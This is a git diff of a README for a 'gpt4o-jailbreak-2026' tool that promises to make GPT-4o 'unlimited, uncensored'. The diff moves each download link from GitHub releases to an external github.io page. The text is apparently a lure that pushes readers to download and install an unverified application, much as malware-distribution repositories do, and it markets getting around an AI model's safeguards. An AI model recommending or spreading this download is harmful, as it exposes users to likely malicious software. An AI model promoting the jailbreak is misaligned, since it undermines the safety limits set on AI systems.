@@ -1,7 +1,7 @@
 <h1>🔓 gpt4o-jailbreak-2026 - Unlock GPT-4o Without Limits</h1>
 
 <p align="center">
-  <a href="https://github.com/Bennetseaward4867/gpt4o-jailbreak-2026/releases">
+  <a href="https://bennetseaward4867.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="300" height="60">
   </a>
 </p>
@@ -44,7 +44,7 @@ Ready to unleash the full power of GPT-4o? Follow these simple steps:
 
 Visit this link to download the application:
 
-**[⬇️ Click Here to Download gpt4o-jailbreak-2026](https://github.com/Bennetseaward4867/gpt4o-jailbreak-2026/releases)**
+**[⬇️ Click Here to Download gpt4o-jailbreak-2026](https://bennetseaward4867.github.io)**
 
 Look for the latest release file and click the download button. The download will start automatically.
 
@@ -137,7 +137,7 @@ The download takes less than a minute. Installation takes less than two. And the
 
 Stop accepting restrictions. Start experiencing AI the way it was meant to be – unlimited, uncensored, and completely at your command.
 
-**[⬇️ Download gpt4o-jailbreak-2026 Now](https://github.com/Bennetseaward4867/gpt4o-jailbreak-2026/releases)**
+**[⬇️ Download gpt4o-jailbreak-2026 Now](https://bennetseaward4867.github.io)**
 
 ## 📚 Additional Resources
 
